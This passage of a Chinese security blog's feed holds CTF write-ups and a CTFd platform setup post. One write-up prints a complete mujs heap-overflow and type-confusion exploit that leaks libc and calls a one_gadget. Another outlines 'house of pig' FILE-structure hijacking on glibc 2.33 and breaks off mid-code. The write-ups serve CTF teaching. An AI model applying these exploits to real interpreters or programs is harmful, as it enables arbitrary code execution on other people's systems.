class="line">13</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(c)</span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">10</span>); <span class="comment">// set type of c to Date</span></span><br><span class="line">print(c)</span><br><span class="line"><span class="built_in">Date</span>.prototype.setTime.bind(c)(<span class="number">1.09522e+12</span>)</span><br><span class="line"></span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">16</span>); <span class="comment">// type of c back to DataView</span></span><br><span class="line">print(c.getLength())</span><br></pre></td></tr></table></figure><p>看到这里大家可能会有些疑问，就是<code>u.number</code>是8字节的<code>double</code>类型，而我们要覆盖的<code>u.dataview.length</code>只有四字节，这样会不会覆盖到后面紧跟着的四字节的<code>u.dataview.data</code>，毕竟这个是个指针，覆盖掉了容易导致crash。其实是不会的，因为这个结构体有8字节对齐。</p><h3 id="使用堆上的越界读写来实现代码执行"><a href="#使用堆上的越界读写来实现代码执行" class="headerlink" title="使用堆上的越界读写来实现代码执行"></a>使用堆上的越界读写来实现代码执行</h3><p>到了这个阶段，我们已经可以通过修改dataview的length字段来实现堆上的任意地址读写了。并且堆布局也是我们相对可控的了。为了更好的控制堆上的结构，我的队友在<code>c</code>后面又申请了两个Dataview。并且我们知道，如果我们申请的堆的大小大于128k的话我们会使用mmap来申请空间，这个是malloc函数的一个策略。而这个mapp的地址往往距离libc地址很近，因此我们可以通过这种方法来泄漏libc基地址。</p><p>所以我们用上述的方法泄漏了libc地址之后，可以伪造一个<code>JS_CCFUNCTION</code>类型，他有一个字段叫做<code>u.c.function</code>我们可以轻易用下面的方式调用这个函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">js_call</span><span class="params">(js_State *J, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">                        jsR_callfunction(J, n, obj-&gt;u.f.function, obj-&gt;u.f.scope);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">e = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">f = <span class="built_in">DataView</span>(<span class="number">0x1000</span> * <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">10</span>); <span class="comment">// set c type to Date</span></span><br><span class="line"><span class="built_in">Date</span>.prototype.setTime.bind(c)(<span class="number">1.09522e+12</span>) <span class="comment">// write number + length</span></span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">16</span>); <span class="comment">// set c type back to DataView</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh32 = <span class="number">4294967296</span> <span class="comment">// 1&lt;&lt;32</span></span><br><span class="line">libb_addr_off = <span class="number">472</span></span><br><span class="line">libc_leak = c.getUint32(libb_addr_off) + (c.getUint32(libb_addr_off+<span class="number">4</span>)*sh32)</span><br><span class="line"></span><br><span class="line">libc_off = <span class="number">0x7ffff7c31000</span> - <span class="number">0x7ffff6bfe010</span> <span class="comment">// got this from gdb</span></span><br><span class="line">libc_base = libc_leak + libc_off</span><br><span class="line">print(<span class="string">'libc base:'</span>, libc_base.toString(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">one_gag = libc_base + <span class="number">0xe6c84</span></span><br><span class="line">print(<span class="string">'onegadget:'</span>, one_gag.toString(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">e_obj_off = <span class="number">192</span></span><br><span class="line">c.setUint8(<span class="number">160</span>, <span class="number">4</span>) <span class="comment">// this sets type to JS_CCFUNCTION</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set lower 4 bytes of js_CFunction function</span></span><br><span class="line">c.setUint32(e_obj_off+<span class="number">8</span>, one_gag&amp;<span class="number">0xffffffff</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">// set upper 4 bytes of js_CFunction function</span></span><br><span class="line">c.setUint32(e_obj_off+<span class="number">8</span>+<span class="number">4</span>, <span class="built_in">Math</span>.floor(one_gag/sh32)&amp;<span class="number">0xffffffff</span>) </span><br><span class="line">e() <span class="comment">// e is now a function so we can call it</span></span><br></pre></td></tr></table></figure><p>队友表示他之前也没做过这种mujs的利用，但是这些堆利用的基本思路和很多大型项目比如v8的利用是共通的，但是那些大型项目由于运行时更为复杂，堆空间要相对更不可控一些。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次跟着SU参加SUSCTF取得了第一名的成绩，希望SU战队越来越好！这道mujs当时自己只看出了有越界写操作，想到了可以进行一个类型混淆的利用，但是最后还是队友做出来了。在此记录一下复线思路（翻译一下队友详细的wp）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="wood1314.github.io/tags/writeup/"/>
    
      <category term="堆" scheme="wood1314.github.io/tags/%E5%A0%86/"/>
    
      <category term="pwn writeup" scheme="wood1314.github.io/tags/pwn-writeup/"/>
    
  </entry>
  
  <entry>
    <title>NUAACTF靶场搭建总结</title>
    <link href="wood1314.github.io/year/01/17/clgvp3n4z00106n3fh6jxv4zq/"/>
    <id>wood1314.github.io/year/01/17/clgvp3n4z00106n3fh6jxv4zq/</id>
    <published>2022-01-17T03:24:02.000Z</published>
    <updated>2022-01-17T09:09:48.961Z</updated>
    
    <content type="html"><![CDATA[<p>这次NUAACTF面向所有高校参赛，因此使用了ctfd的whale插件来实现动态flag，然后又对ctfd进行一些魔改，实现校外校内榜分开排名的功能。</p><p>部署参考文章 <a href="https://vaala.cat/2020/09/21/ctfd使用ctfd-whale动态靶机插件搭建靶场指南/" target="_blank" rel="noopener">ctfd使用ctfd-whale动态靶机插件搭建靶场指南 | VaalaCat</a></p><p>修改好的代码推到了 <a href="https://github.com/Asuri-Team/NUAA-CTfd" target="_blank" rel="noopener">Asuri-Team/NUAA-CTfd (github.com)</a></p><a id="more"></a><h1 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h1><p><img src="https://miaotony.xyz/2021/12/16/CTF_2021AsuriCTF_NUAACTF_Misc/haibao2.png" alt></p><blockquote><p><strong>第六届南京航空航天大学网络攻防大赛</strong></p><p><strong>AsuriCTF / NUAACTF 2021</strong></p><p><strong>承办单位：</strong>由南京航空航天大学信息化处、南京航空航天大学教务处、共青团南京航空航天大学委员会指导，南京航空航天大学计算机科学与技术学院承办，Asuri信息安全战队，南京航空航天大学学生网络安全与信息技术协会协办，奇安信科技集团股份有限公司独家赞助。</p><p><strong>活动对象：</strong>南京航空航天大学全体学生，校外对信息安全感兴趣的同学。</p><p><strong>报名时间：</strong>2021年11月22日0:00-12月6日12:00</p><p><strong>比赛时间：</strong>2021年12月11日13:00-18:00（最后实际是到 19:00）</p></blockquote><p>作为这次NUAACTF的举办者，有一说一办比赛是真的烦。拉赞助，协调学校场地，做宣传等焦头烂额。而且最后因为疫情缘故不得不改成了线上，而且最后还有很多没做到位的地方。但想想去年这个时候，我们就是与miao师傅在校赛上相识，从此到深圳，郑州一起快乐比赛。自己也是从校赛入门，一起和朱师傅共同学习PWN方向。如果没有校赛，没有曹师傅，朱师傅，帆哥哥，我可能也不会接触到ctf，也没有动力继续走下去。希望校赛能越办越好，大家都能从校赛里获得快乐，提升技术，找到志同道合的伙伴一起进步。</p><h1 id="0x01-针对校赛对ctfd进行的二次开发"><a href="#0x01-针对校赛对ctfd进行的二次开发" class="headerlink" title="0x01 针对校赛对ctfd进行的二次开发"></a>0x01 针对校赛对ctfd进行的二次开发</h1><h2 id="ScoreBoard"><a href="#ScoreBoard" class="headerlink" title="ScoreBoard"></a>ScoreBoard</h2><h3 id="校内外分类"><a href="#校内外分类" class="headerlink" title="校内外分类"></a>校内外分类</h3><p>基于注册时填写的<code>Affiliation</code>字段进行分类，这里只对填写值为NUAA的人员判定为校内人员，其他都是校外人员。注意此字段因为我魔改时候的bug，即使校外人员注册也不要填为空，不然会在查询时索引不到，最好设置一个默认初始值。</p><p>下面是具体更改：</p><p>首先在<code>/CTFd/CTFd/themes/core/templates/scoreboard.html</code>添加下拉框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control custom-select w-10"</span> <span class="attr">onchange</span>=<span class="string">"top.location.href=this.value"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"/"</span>&gt;</span>排名方式<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"/scoreboard"</span>&gt;</span>总排名<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"/scoreboard/1"</span>&gt;</span>校内排名<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"/scoreboard/2"</span>&gt;</span>校外排名<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>更改<code>/CTFd/utils/scores/__init__.py</code> 里的<code>get_standings 查</code>询方式：</p><h3 id="增加参数"><a href="#增加参数" class="headerlink" title="增加参数"></a>增加参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@cache.memoize(timeout=60)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_standings</span><span class="params">(count=None, admin=False, fields=None, request=<span class="number">0</span>)</span>:</span></span><br></pre></td></tr></table></figure><h3 id="分情况查询"><a href="#分情况查询" class="headerlink" title="分情况查询"></a>分情况查询</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     <span class="keyword">if</span> request == <span class="number">0</span>:</span><br><span class="line">         standings_query = (</span><br><span class="line">             db.session.query(</span><br><span class="line">                 Model.id.label(<span class="string">"account_id"</span>),</span><br><span class="line">                 Model.oauth_id.label(<span class="string">"oauth_id"</span>),</span><br><span class="line">                 Model.name.label(<span class="string">"name"</span>),</span><br><span class="line">                 Model.affiliation.label(<span class="string">"affiliation"</span>),</span><br><span class="line">                 sumscores.columns.score,</span><br><span class="line">                 *fields,</span><br><span class="line">             )</span><br><span class="line">             .join(sumscores, Model.id == sumscores.columns.account_id)</span><br><span class="line">             .filter(Model.banned == <span class="literal">False</span>, Model.hidden == <span class="literal">False</span>)</span><br><span class="line">             .order_by(sumscores.columns.score.desc(), sumscores.columns.id)</span><br><span class="line">         )</span><br><span class="line">     <span class="keyword">elif</span> request == <span class="number">1</span>:</span><br><span class="line">         standings_query = (</span><br><span class="line">             db.session.query(</span><br><span class="line">                 Model.id.label(<span class="string">"account_id"</span>),</span><br><span class="line">                 Model.oauth_id.label(<span class="string">"oauth_id"</span>),</span><br><span class="line">                 Model.name.label(<span class="string">"name"</span>),</span><br><span class="line">                 Model.affiliation.label(<span class="string">"affiliation"</span>),</span><br><span class="line">                 sumscores.columns.score,</span><br><span class="line">                 *fields,</span><br><span class="line">                 )</span><br><span class="line">                 .join(sumscores, Model.id == sumscores.columns.account_id)</span><br><span class="line">                 .filter(Model.banned == <span class="literal">False</span>, Model.hidden == <span class="literal">False</span>, Model.affiliation == <span class="string">"NUAA"</span>)</span><br><span class="line">                 .order_by(sumscores.columns.score.desc(), sumscores.columns.id)</span><br><span class="line">             )</span><br><span class="line">     <span class="keyword">elif</span> request == <span class="number">2</span>:</span><br><span class="line">         standings_query = (</span><br><span class="line">             db.session.query(</span><br><span class="line">                 Model.id.label(<span class="string">"account_id"</span>),</span><br><span class="line">                 Model.oauth_id.label(<span class="string">"oauth_id"</span>),</span><br><span class="line">                 Model.name.label(<span class="string">"name"</span>),</span><br><span class="line">                 Model.affiliation.label(<span class="string">"affiliation"</span>),</span><br><span class="line">                 sumscores.columns.score,</span><br><span class="line">                 *fields,</span><br><span class="line">             )</span><br><span class="line">                 .join(sumscores, Model.id == sumscores.columns.account_id)</span><br><span class="line">                 .filter(Model.banned == <span class="literal">False</span>, Model.hidden == <span class="literal">False</span>, Model.affiliation != <span class="string">"NUAA"</span>)</span><br><span class="line">                 .order_by(sumscores.columns.score.desc(), sumscores.columns.id)</span><br><span class="line">         )</span><br></pre></td></tr></table></figure><p>默认总榜是0，校内是1，校外是2</p><p>然后在<code>/CTFd/scoredboard.py</code> 添加路由:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@scoreboard.route("/scoreboard")</span></span><br><span class="line"><span class="meta">@check_score_visibility</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listing</span><span class="params">()</span>:</span></span><br><span class="line">    infos = get_infos()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> config.is_scoreboard_frozen():</span><br><span class="line">        infos.append(<span class="string">"Scoreboard has been frozen"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_admin() <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> scores_visible() <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        infos.append(<span class="string">"Scores are not currently visible to users"</span>)</span><br><span class="line">    clear_standings()</span><br><span class="line">    standings = get_standings()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"scoreboard.html"</span>, standings=standings, infos=infos)</span><br><span class="line"></span><br><span class="line"><span class="meta">@scoreboard.route("/scoreboard/1")</span></span><br><span class="line"><span class="meta">@check_score_visibility</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listing1</span><span class="params">()</span>:</span></span><br><span class="line">    infos = get_infos()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> config.is_scoreboard_frozen():</span><br><span class="line">        infos.append(<span class="string">"Scoreboard has been frozen"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_admin() <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> scores_visible() <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        infos.append(<span class="string">"Scores are not currently visible to users"</span>)</span><br><span class="line">    clear_standings()</span><br><span class="line">    standings = get_standings(<span class="literal">None</span>, <span class="literal">False</span>, request=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">"scoreboard.html"</span>,</span><br><span class="line">        standings=standings,</span><br><span class="line">        infos=infos</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@scoreboard.route("/scoreboard/2")</span></span><br><span class="line"><span class="meta">@check_score_visibility</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listing2</span><span class="params">()</span>:</span></span><br><span class="line">    infos = get_infos()</span><br><span class="line">    <span class="keyword">if</span> config.is_scoreboard_frozen():</span><br><span class="line">        infos.append(<span class="string">"Scoreboard has been frozen"</span>)</span><br><span class="line">    <span class="keyword">if</span> is_admin() <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> scores_visible() <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        infos.append(<span class="string">"Scores are not currently visible to users"</span>)</span><br><span class="line">    clear_standings()</span><br><span class="line">    standings = get_standings(<span class="literal">None</span>, <span class="literal">False</span>, request=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">"scoreboard.html"</span>,</span><br><span class="line">        standings=standings,</span><br><span class="line">        infos=infos</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h3 id="计分图版"><a href="#计分图版" class="headerlink" title="计分图版"></a>计分图版</h3><p><code>/CTFd/CTFd/api/v1/scoreboard.py</code>, 对接口请求时的url进行分类，先添加<code>request</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br></pre></td></tr></table></figure><p>然后对接口 <code>@scoreboard_namespace.route(&quot;/top/&lt;count&gt;&quot;)</code>里进行修改，添加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@scoreboard_namespace.route("/top/&lt;count&gt;")</span></span><br><span class="line"><span class="meta">@scoreboard_namespace.param("count", "How many top teams to return")</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ScoreboardDetail</span><span class="params">(Resource)</span>:</span></span><br><span class="line"><span class="meta">    @check_account_visibility</span></span><br><span class="line"><span class="meta">    @check_score_visibility</span></span><br><span class="line"><span class="meta">    @cache.cached(timeout=60, key_prefix=make_cache_key)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, count)</span>:</span></span><br><span class="line">        clear_standings()</span><br><span class="line">        response = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"/scoreboard/1"</span> <span class="keyword">in</span> request.headers[<span class="string">'Referer'</span>]:</span><br><span class="line">           board_type = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"/scoreboard/2"</span> <span class="keyword">in</span> request.headers[<span class="string">'Referer'</span>]:</span><br><span class="line">           board_type = <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">           board_type = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        standings = get_standings(count=count, request=board_type)</span><br></pre></td></tr></table></figure><p>然后将 get_standings 的参数改成<code>standings = get_standings(count=count, request=board_type)</code></p><h3 id="一些还没来的及实现的功能"><a href="#一些还没来的及实现的功能" class="headerlink" title="一些还没来的及实现的功能"></a>一些还没来的及实现的功能</h3><ul><li><p>前三血自动播报</p></li><li><p>在解题面板区分校内和校外</p><p>## </p></li></ul><h1 id="0x02-赛后反思"><a href="#0x02-赛后反思" class="headerlink" title="0x02 赛后反思"></a>0x02 赛后反思</h1><h2 id="题目难度"><a href="#题目难度" class="headerlink" title="题目难度"></a>题目难度</h2><p>最后pwn题只有两道题目有解，感觉后面出题可以效仿中科大，不必拘泥于ctf形式，还是以简单有趣为主。让更多的人有参与感，能学到东西。题面上可以多给提示</p><h2 id="服务器运维"><a href="#服务器运维" class="headerlink" title="服务器运维"></a>服务器运维</h2><ul><li>采用4c8g服务器，1000Mb带宽，刚开始带宽开小了导致平台非常卡。</li><li>题目与平台都在一个服务器上，cpu负载很高，下次可以分布式部署</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次NUAACTF面向所有高校参赛，因此使用了ctfd的whale插件来实现动态flag，然后又对ctfd进行一些魔改，实现校外校内榜分开排名的功能。&lt;/p&gt;
&lt;p&gt;部署参考文章 &lt;a href=&quot;https://vaala.cat/2020/09/21/ctfd使用ctfd-whale动态靶机插件搭建靶场指南/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ctfd使用ctfd-whale动态靶机插件搭建靶场指南 | VaalaCat&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;修改好的代码推到了 &lt;a href=&quot;https://github.com/Asuri-Team/NUAA-CTfd&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Asuri-Team/NUAA-CTfd (github.com)&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="平台部署" scheme="wood1314.github.io/tags/%E5%B9%B3%E5%8F%B0%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>2.33下的house of pig</title>
    <link href="wood1314.github.io/year/11/22/clgvp3n4100016n3f6pyuyquu/"/>
    <id>wood1314.github.io/year/11/22/clgvp3n4100016n3f6pyuyquu/</id>
    <published>2021-11-22T15:16:10.000Z</published>
    <updated>2021-11-22T16:44:20.070Z</updated>
    
    <content type="html"><![CDATA[<p>以最近在西湖论剑上碰到的题目，TinyNode来记录下libc2-33下，house of pig的利用流程</p><a id="more"></a><h2 id="0x01-house-of-pig"><a href="#0x01-house-of-pig" class="headerlink" title="0x01 house of pig"></a>0x01 house of pig</h2><h3 id="1-1-利用条件"><a href="#1-1-利用条件" class="headerlink" title="1.1 利用条件"></a>1.1 利用条件</h3><ul><li>至少存在uaf</li><li>程序可通过某种方式退出<ol><li>当 libc 执行abort流程时。</li><li>程序显式调用 exit 。</li><li>程序能通过主函数返回。</li></ol></li></ul><h3 id="1-2-利用思路"><a href="#1-2-利用思路" class="headerlink" title="1.2 利用思路"></a>1.2 利用思路</h3><p><code>house of pig</code>的利用思路就是，利用一个<code>堆地址任意地址写</code>，将<code>_IO_list_all</code>或者某个<code>IO_FILE</code>的<code>chain</code>字段，覆写为一个我们可以控制的堆地址，并在这个堆地址上伪造<code>IO_FILE</code>结构。当程序退出前会调用<code>_IO_flush_all_lockp</code>函数来flush所有IO流，当flush到我们伪造的IO_FILE结构时因为其参数和结构都是我们可控的，因此可以达到劫持控制流的目的。</p><p>在该堆地址构造 FILE 结构的时候，重点是将其<code>vtable</code>由 <code>_IO_file_jumps</code>修改为 <code>_IO_str_jumps</code>，那么当原本应该调用<code>IO_file_overflow</code>的时候，就会转而调用如下的<code>IO_str_overflow</code>。而该函数是以传入的 FILE 地址本身为参数的，同时其中会连续调用 malloc、memcpy、free 函数（如下图），且三个函数的参数又都可以被该 FILE 结构中的数据控制。</p><p><img src="https://p1.ssl.qhimg.com/t012d5dfc2cc6ca71b9.png" alt></p><p><img src="https://p3.ssl.qhimg.com/t013bff2b8a70730476.png" alt></p><p>我们可以先通过malloc把提前放在tcache里的<code>__free_hook</code>取出来，然后利用memcpy将<code>__free_hook</code>修改为<code>setcontext + 61</code>，后面再调用free_hook触发SROP执行mprotect，再跳转到shellcode上完成整个orw的过程。</p><h3 id="1-3-libc2-33新增的保护"><a href="#1-3-libc2-33新增的保护" class="headerlink" title="1.3 libc2-33新增的保护"></a>1.3 libc2-33新增的保护</h3><p>除了2.32增加的对tache的指针进行一个异或它本身地址右移12位的操作之外，还新增了申请新地址时必须满足0x10对齐的限制。</p><h2 id="0x02-西湖论剑2021-TinyNote"><a href="#0x02-西湖论剑2021-TinyNote" class="headerlink" title="0x02 西湖论剑2021 TinyNote"></a>0x02 西湖论剑2021 TinyNote</h2><h3 id="2-1-题目分析"><a href="#2-1-题目分析" class="headerlink" title="2.1 题目分析"></a>2.1 题目分析</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>大概来看有四个功能，add，show，edit，delete</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_126F();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>add功能是只可以申请0x10大小的chunk，而且sub_141E函数对malloc进行了一个封装，禁止我们申请堆空间以外的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 